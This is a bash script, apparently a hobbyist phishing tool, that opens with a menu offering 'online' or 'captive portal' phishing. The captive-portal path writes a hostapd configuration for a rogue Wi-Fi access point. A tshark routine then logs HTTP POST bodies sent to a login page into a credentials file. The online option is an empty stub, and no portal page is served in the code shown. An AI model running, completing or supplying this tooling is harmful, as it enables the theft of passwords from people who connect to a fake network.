#!/bin/bash

# Function to clear the terminal
clear_terminal() {
    clear
}

# Function to display the big welcome message
big_welcome() {
    echo -e "${RED} __    __    ___  _        __   ___   ___ ___    ___      __ __   ____    __  __  _    ___  ____  ${NC}"
    echo -e "${RED}|  |__|  |  /  _]| |      /  ] /   \ |   |   |  /  _]    |  |  | /    |  /  ]|  |/ ]  /  _]|    \ ${NC}"
    echo -e "${RED}|  |  |  | /  [_ | |     /  / |     || _   _ | /  [_     |  |  ||  o  | /  / |  ' /  /  [_ |  D  )${NC}"
    echo -e "${RED}|  |  |  ||    _]| |___ /  /  |  O  ||  \_/  ||    _]    |  _  ||     |/  /  |    \ |    _]|    / ${NC}"
    echo -e "${RED}|  \`  '  ||   [_ |     /   \_ |     ||   |   ||   [_     |  |  ||  _  /   \_ |     ||   [_ |    \ ${NC}"
    echo -e "${RED} \      / |     ||     \     ||     ||   |   ||     |    |  |  ||  |  \     ||  .  ||     ||  .  \${NC}"
    echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"
}

# Function to display the menu for phishing options
menu() {
    echo -e "Select phishing method:"
    echo "1. Online Phishing"
    echo "2. Captive Portal Phishing"
    read -p "Enter your choice: " choice
    case $choice in
        1) online_phishing ;;
        2) captive_portal_phishing ;;
        *) echo "Invalid choice. Please try again." ;;
    esac
}

# Function for online phishing
online_phishing() {
    echo "Online Phishing selected."
    # Implement online phishing logic here
}

# Function for captive portal phishing
captive_portal_phishing() {
    echo "Captive Portal Phishing selected."
    # Start captive portal phishing
    create_hostapd_conf
}

# Function to create hostapd.conf
create_hostapd_conf() {
    echo "Creating hostapd.conf..."

    # Prompt user for SSID
    read -p "Enter SSID (network name): " ssid

    # Prompt user for passphrase
    read -p "Enter passphrase (8-63 characters): " passphrase

    # Prompt user for channel
    read -p "Enter channel (1-11): " channel

    # Prompt user for interface name
    read -p "Enter interface name (e.g., wlan0): " interface

    # Construct hostapd.conf content
    cat <<EOF >hostapd.conf
interface=$interface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=$passphrase
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF

    echo "hostapd.conf created successfully."
}

# Function to continuously capture credentials using tshark
capture_creds() {
    echo "Waiting for credentials..."
    # Capture HTTP POST requests containing login credentials
    tshark -i "$interface" -Y "http.request.method == POST && http.request.uri.path == '/login.php'" -T fields -e http.request.method -e http.request.uri.path -e http.request.uri.query -e http.request.body -E separator='|' >> creds.txt
}

# Main script starts here

# Clear the terminal
clear_terminal

# Display the big welcome message
big_welcome

# Call the menu function to start
menu

# Continuously capture credentials
capture_creds

